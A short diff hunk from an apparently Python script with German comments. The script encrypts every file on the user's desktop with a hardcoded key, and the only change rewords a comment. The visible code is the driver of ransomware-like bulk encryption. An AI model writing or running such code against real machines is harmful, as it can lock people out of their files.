@@ -41,7 +41,7 @@ def encrypt_files_on_desktop(key):
             encrypt_file(file_path, key)
 
 # Hauptprogramm
-password = b'YourEncryptionKey'  # Hier dein Verschlüsselungsschlüssel
+password = b'YourEncryptionKey'  # Hier der Verschlüsselungsschlüssel
 
 encrypt_files_on_desktop(password)
 
